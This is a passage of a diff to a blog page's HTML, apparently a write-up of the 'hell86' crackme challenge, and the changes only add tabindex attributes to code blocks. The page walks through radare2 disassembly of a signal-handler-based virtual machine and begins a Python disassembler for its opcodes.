@@ -8,7 +8,7 @@ Takes one command line argument and outputs &amp;ldquo;OK!&amp;rdquo; if it&amp;
 Don&amp;rsquo;t patch the binary, of course - find the correct input.&lt;/p>
 &lt;/blockquote>
 &lt;p>Lets open the binary in radare2 and we&amp;rsquo;ll look at the disassembly of the main function&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">110&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> main (&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv);
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">110&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> main (&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv);
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; arg &lt;span style="color:#66d9ef">int&lt;/span> argc &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rdi
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; arg &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsi
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x00000fc0&lt;/span> &lt;span style="color:#ae81ff">55&lt;/span> push rbp ; [&lt;span style="color:#ae81ff">14&lt;/span>] &lt;span style="color:#f92672">-&lt;/span>r&lt;span style="color:#f92672">-&lt;/span>x section size &lt;span style="color:#ae81ff">4002&lt;/span> named .text
@@ -50,7 +50,7 @@ Don&amp;rsquo;t patch the binary, of course - find the correct input.&lt;/p>
 &lt;h2 id="sigaltstack-function">sigaltstack function&lt;/h2>
 &lt;p>The first function allocates 0x2000 bytes on the heap for an alternate stack for the signal handlers and the stack pointer points to the new stack which had been allocated also the flags have been set to 0 and later on it calls the sigaltstack function and if it encounters any errors it free&amp;rsquo;s the allocated memory.&lt;/p>
 &lt;p>This is an example for defining an alternate stack&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c"> &lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;signal.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c"> &lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;signal.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
 &lt;span style="color:#66d9ef">if&lt;/span> ((sigstk.ss_sp &lt;span style="color:#f92672">=&lt;/span> malloc(SIGSTKSZ)) &lt;span style="color:#f92672">==&lt;/span> NULL)
 &lt;span style="color:#75715e">/* Error return. */&lt;/span>
@@ -59,7 +59,7 @@ sigstk.ss_flags &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color
 &lt;span style="color:#66d9ef">if&lt;/span> (sigaltstack(&lt;span style="color:#f92672">&amp;amp;&lt;/span>sigstk,(stack_t &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
 perror(&lt;span style="color:#e6db74">&amp;#34;sigaltstack&amp;#34;&lt;/span>);
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The actual function&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span>&lt;span style="color:#f92672">:&lt;/span> sigaltstack ();
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span>&lt;span style="color:#f92672">:&lt;/span> sigaltstack ();
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>var_8h &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x8&lt;/span>
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">int64_t&lt;/span> var_18h &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x18&lt;/span>
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000019c6&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> push rbx
@@ -102,7 +102,7 @@ the signal-catching function and the application shall not modify the sa_sigacti
 &lt;p>If SA_SIGINFO is set and the signal is caught, the signal-catching function shall be entered as:&lt;/p>
 &lt;p>void func(int signo, siginfo_t *info, void *context);&lt;/p>
 &lt;p>where two additional arguments are passed to the signal-catching function. The second argument shall point to an object of type siginfo_t explaining the reason why the signal was generated; the third argument can be cast to a pointer to an object of type ucontext_t to refer to the receiving thread&amp;rsquo;s context that was interrupted when the signal was delivered. In this case, the application shall use the sa_sigaction member to describe the signal-catching function and the application shall not modify the sa_handler member.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#f92672">:&lt;/span> sigill_handler ();
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">97&lt;/span>&lt;span style="color:#f92672">:&lt;/span> sigill_handler ();
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sigaction&lt;/span> &lt;span style="color:#f92672">*&lt;/span>act &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x8&lt;/span>
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">int64_t&lt;/span> var_10h &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x10&lt;/span>
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> ; var &lt;span style="color:#66d9ef">int64_t&lt;/span> var_90h &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x90&lt;/span>
@@ -134,7 +134,7 @@ the signal-catching function and the application shall not modify the sa_sigacti
 &lt;span style="color:#960050;background-color:#1e0010">└&lt;/span> &lt;span style="color:#ae81ff">0x000019c5&lt;/span> c3 ret
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>lets dig deep down the handler routine&lt;/p>
 &lt;p>The handler holds a struct uncontext and in which uc_mcontext holds the GPR&amp;rsquo;s (general purpose registers) for hell86 and as we see it uses the same registers of the x64 architecture for hell86&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ptype ucontext_t
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ptype ucontext_t
 type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">ucontext_t&lt;/span> {
 &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> uc_flags;
 &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">ucontext_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>uc_link;
@@ -144,7 +144,7 @@ sigset_t uc_sigmask;
 &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_libc_fpstate&lt;/span> __fpregs_mem;
 &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> __ssp[&lt;span style="color:#ae81ff">4&lt;/span>];
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ptype mcontext_t
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ptype mcontext_t
 type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
 gregset_t gregs;
 fpregset_t fpregs;
@@ -153,20 +153,20 @@ fpregset_t fpregs;
 gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ptype gregset_t
 type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> [&lt;span style="color:#ae81ff">23&lt;/span>]
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="/images/gpr.png" alt="">&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">;DATA XREF from fcn&lt;span style="color:#ae81ff">.00001965&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0x197b&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">;DATA XREF from fcn&lt;span style="color:#ae81ff">.00001965&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0x197b&lt;/span>
 &lt;span style="color:#ae81ff">0x00001946&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>b82a80000. mov rax, qword [rdx &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xa8&lt;/span>] ; rax &lt;span style="color:#f92672">=&lt;/span> addr of ud2
 &lt;span style="color:#ae81ff">0x0000194d&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d7228 lea rsi, [rdx &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>] ; rsi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">register&lt;/span>(ucontext_t)
 &lt;span style="color:#ae81ff">0x00001951&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d7802 lea rdi, [rax &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>] ; rdi &lt;span style="color:#f92672">=&lt;/span> the next bytes after the encountered ud2
 &lt;span style="color:#ae81ff">0x00001955&lt;/span> &lt;span style="color:#ae81ff">4883&lt;/span>c00e add rax, &lt;span style="color:#ae81ff">0xe&lt;/span> ; rax &lt;span style="color:#f92672">=&lt;/span> points to the enocountered ud2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xe&lt;/span> &lt;span style="color:#f92672">=&lt;/span> next ud2
 &lt;span style="color:#ae81ff">0x00001959&lt;/span> &lt;span style="color:#ae81ff">488982&lt;/span>a80000. mov qword [rdx &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xa8&lt;/span>], rax
 &lt;span style="color:#ae81ff">0x00001960&lt;/span> e97b050000 jmp &lt;span style="color:#ae81ff">0x1ee0&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp"> ; CODE XREF from fcn&lt;span style="color:#ae81ff">.00001192&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x7ce&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp"> ; CODE XREF from fcn&lt;span style="color:#ae81ff">.00001192&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x7ce&lt;/span>
 &lt;span style="color:#ae81ff">0x00001ee0&lt;/span> &lt;span style="color:#ae81ff">0f&lt;/span>b65708 movzx edx, byte [rdi &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>]
 &lt;span style="color:#ae81ff">0x00001ee4&lt;/span> &lt;span style="color:#ae81ff">488&lt;/span>d05951120. lea rax, [&lt;span style="color:#ae81ff">0x00203080&lt;/span>]
 &lt;span style="color:#ae81ff">0x00001eeb&lt;/span> ff24d0 jmp qword [rax &lt;span style="color:#f92672">+&lt;/span> rdx&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>]
 &lt;span style="color:#ae81ff">0x00001eee&lt;/span> &lt;span style="color:#ae81ff">6690&lt;/span> nop
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The byte at &lt;code>rdi+8&lt;/code> indexes a jump table at &lt;code>0x00203080&lt;/code> and the jump table which consists of 50 instructions for the vm to use and they are shown below&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#ae81ff">0x00203080&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a1f&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a20&lt;/span> ........ .......
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#ae81ff">0x00203080&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a1f&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a20&lt;/span> ........ .......
 &lt;span style="color:#ae81ff">0x00203090&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a39&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a52&lt;/span> &lt;span style="color:#ae81ff">9.&lt;/span>......R.......
 &lt;span style="color:#ae81ff">0x002030a0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a6c&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001a87&lt;/span> l...............
 &lt;span style="color:#ae81ff">0x002030b0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001aa2&lt;/span> &lt;span style="color:#ae81ff">0x0000000000001abe&lt;/span> ................
@@ -209,7 +209,7 @@ type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">l
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span> flag_verification ();
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span> flag_verification ();
 &lt;span style="color:#960050;background-color:#1e0010">└&lt;/span> &lt;span style="color:#ae81ff">0x00001190&lt;/span> &lt;span style="color:#ae81ff">0f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>b ud2
 ; CALL XREF from main &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">0xfed&lt;/span>
 &lt;span style="color:#960050;background-color:#1e0010">┌&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>&lt;span style="color:#f92672">:&lt;/span> fcn&lt;span style="color:#ae81ff">.00001192&lt;/span> (&lt;span style="color:#66d9ef">int64_t&lt;/span> arg4);
@@ -226,7 +226,7 @@ type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">l
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000011a8&lt;/span> &lt;span style="color:#ae81ff">2400&lt;/span> and al, &lt;span style="color:#ae81ff">0&lt;/span>
 &lt;span style="color:#960050;background-color:#1e0010">│&lt;/span> &lt;span style="color:#ae81ff">0x000011aa&lt;/span> &lt;span style="color:#ae81ff">0800&lt;/span> or byte [rax], al
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The structure of the instructions for hell86 would look like this&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">ins&lt;/span> {
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">ins&lt;/span> {
 &lt;span style="color:#66d9ef">uint16_t&lt;/span> ud2;
 &lt;span style="color:#66d9ef">uint64_t&lt;/span> imm;
 &lt;span style="color:#66d9ef">uint8_t&lt;/span> opcode;
@@ -237,86 +237,86 @@ type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">l
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>As we now know the routine of the handler its pretty easy to reverse the flag verification function so that being set we&amp;rsquo;ll need to make a disassembler and a script to reverse the flag function in order to get the flag&lt;/p>
 &lt;h2 id="disassembler">Disassembler&lt;/h2>
 &lt;p>we can use objdump or gdb to dump the flag verification function from the binary&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">▲&lt;/span> reversing&lt;span style="color:#f92672">/&lt;/span>vm&lt;span style="color:#f92672">/&lt;/span>hell86 gef hell86
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="color:#960050;background-color:#1e0010">▲&lt;/span> reversing&lt;span style="color:#f92672">/&lt;/span>vm&lt;span style="color:#f92672">/&lt;/span>hell86 gef hell86
 GEF &lt;span style="color:#66d9ef">for&lt;/span> linux ready, type &lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>gef&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> to start, &lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>gef config&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> to configure
 &lt;span style="color:#ae81ff">92&lt;/span> commands loaded &lt;span style="color:#66d9ef">for&lt;/span> GDB &lt;span style="color:#ae81ff">10.1&lt;/span> &lt;span style="color:#66d9ef">using&lt;/span> Python engine &lt;span style="color:#ae81ff">3.9&lt;/span>
 Reading symbols from hell86...
 (No debugging symbols found in hell86)
 gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> dump binary memory flag_func &lt;span style="color:#ae81ff">0x1190&lt;/span> &lt;span style="color:#ae81ff">0x1946&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>As it was my first time creating a diassembler i got some help from a previously made disassembler.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">disassemble&lt;/span>(instructions):
 registers &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;r8&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r9&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r10&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r11&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r12&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r13&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r14&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r15&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rdi&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rsi&amp;#39;&lt;/span>,
 &lt;span style="color:#e6db74">&amp;#39;rbp&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rbx&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rdx&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rax&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rcx&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rsp&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rip&amp;#39;&lt;/span>]
 asm_instr &lt;span style="color:#f92672">=&lt;/span> [
 &lt;span style="color:#e6db74">&amp;#39;nop&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># no operation&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} + {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># addition&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} - {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># subtract&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} * {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># multiply&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} / {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># division (quotient)&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} % {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># division (reminder)&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} &amp;gt;&amp;gt; {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># right shift&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} &amp;lt;&amp;lt; {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># left shift&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = -{2:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># negation&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = 0x{0:x}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># mov a, b&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = byte [{2:s}+0x{0:x}]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movzx&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = byte [{2:s}+0x{0:x}]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movsx&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = word [{2:s}+0x{0:x}]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movzx&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = word [{2:s}+0x{0:x}]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movsx&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = dword [{2:s}+0x{0:x}]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movzx&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = dword [{2:s}+0x{0:x}]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movsx&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = qword [{2:s}+0x{0:x}]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># mov&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;mov byte [{2:s}+0x{0:x}], {3:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;mov word [{2:s}+0x{0:x}], {3:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;mov dword [{2:s}+0x{0:x}], {3:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;mov qword [{2:s}+0x{0:x}], {3:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;push {2:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;push 0x{0:x}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;pop {1:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} | {3:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} &amp;amp; {3:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = {2:s} ^ {3:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;{1:s} = ~ {2:s}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;cmp.s {1:s}, {2:s}, {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># smaller&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;cmp.se {1:s}, {2:s}, {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># smaller or equal&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;cmp.g {1:s}, {2:s}, {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># greater&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;cmp.ge {1:s}, {2:s}, {3:s} &amp;#39;&lt;/span>, &lt;span style="color:#75715e"># greater or equal&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s} == {3:s} ; {1:s} = 1&amp;#39;&lt;/span>, &lt;span style="color:#75715e">#equal&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;cmp.in {1:s}, {2:s}, {3:s}&amp;#39;&lt;/span>, &lt;span style="color:#75715e">#inequal&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;cmp.eq {1:s}, {2:s}, 0x{0:x}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># if equal to const&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{2:s} != 0x{0:x} ; {1:s} = 1&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># if inequal to const&lt;/span>
